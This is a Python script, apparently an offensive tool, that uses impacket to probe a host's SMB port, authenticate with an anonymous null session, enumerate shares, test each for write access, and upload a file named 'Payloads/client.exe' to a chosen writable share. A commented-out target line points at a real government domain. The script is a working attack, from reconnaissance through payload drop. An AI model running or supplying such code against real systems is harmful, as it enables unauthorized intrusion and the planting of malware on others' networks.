from impacket.smbconnection import SMBConnection
import socket
import sys
from colorama import Fore


#target_ip = "fbi.gov"  # Replace with the target IP or hostname
user = ""
password = "" # Checks for null session
port = 445 # SMB Port
local_file_path = 'Payloads/client.exe'
remote_file_path = 'client.exe'
domain = ""

def upload_file(remote_host, username, password, domain, local_file_path, remote_share, remote_file_path):
    try:
        smb_connection = SMBConnection(remote_host, remote_host)
        smb_connection.login(username, password, domain)

        # Open the local file
        with open(local_file_path, 'rb') as file_obj:
            # Store the file on the remote share
            smb_connection.putFile(remote_share, remote_file_path, file_obj.read)

        print(Fore.RED + "   └──=>" + " \033[38;5;208m[*]\033[0m " + Fore.WHITE + f"File Uploaded Successfully: {remote_file_path}" + Fore.RESET)
    except Exception as e:
        print(Fore.RED + "   └──=>" + Fore,RED + " [File Upload Failed] " + Fore.WHITE + f"{e}" + Fore.RESET)


def check_SMB(ip,port):
    print("[" + Fore.RED + "Target" + Fore.RESET + "] " + Fore.WHITE + ip + Fore.RESET)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        print("[" + Fore.RED + "Checking SMB Service" + Fore.RESET + "] " + Fore.WHITE +  f"Port {port} is open" + Fore.RESET)

        try:
            smb = SMBConnection(remoteName=ip, remoteHost=ip)
            smb.login(user, password)
            print("[" + Fore.RED + "Security Warning" + Fore.WHITE + "] Authenticated with Null Session" + Fore.RESET)
            shares = smb.listShares()  # This returns a list of Share objects
            writable_shares = []  # Define the list to store share names

            for share in shares:
                share_name = share['shi1_netname'][:-1]  # Remove the trailing null byte
                try:
                    # Try creating a directory (then delete it) to test write access
                    test_dir_name = 'smb_test_dir' # directory name
                    smb.createDirectory(share_name, test_dir_name) # create directory
                    smb.deleteDirectory(share_name, test_dir_name) # delete directory
                    writable_shares.append(share_name)
                except Exception as e:
                    pass

            print(Fore.WHITE + "[" + Fore.RED + "Exploitation" + Fore.WHITE + "]" + Fore.RESET)
            for x in writable_shares:
                print(Fore.RED + "   └──=>" + " \033[38;5;208m[*]\033[0m " + Fore.WHITE + "Found Writable Share: " + x + Fore.RESET)
            upload = input(Fore.RED + "   └──=>" + " \033[38;5;208m[!]\033[0m " + Fore.WHITE + "Upload File " + "Y/N? " + Fore.RESET)
            if upload.lower() == "y":
                sharex = input(Fore.RED + "   └──=>" +  " \033[38;5;208m[!]\033[0m " + Fore.WHITE + "Enter Share Name: " + Fore.RESET)
                upload_file(ip,user,password,domain,local_file_path, sharex,remote_file_path)

        except Exception as e:
            print("[" + Fore.RED + "Anonymous Session Failed" + Fore.WHITE + f"] {str(e)}" + Fore.RESET) # if null session fails output error
    except socket.error:
        print("[" + Fore.RED + "Checking SMB Service" + Fore.RESET + "] " + Fore.WHITE +  f"Port {port} is closed" + Fore.RESET)
        print("[" + Fore.RED + "Initiating Program Shutdown" + Fore.RESET + "] " + "Goodbye")
        sys.exit()

#check_SMB(target_ip,port)


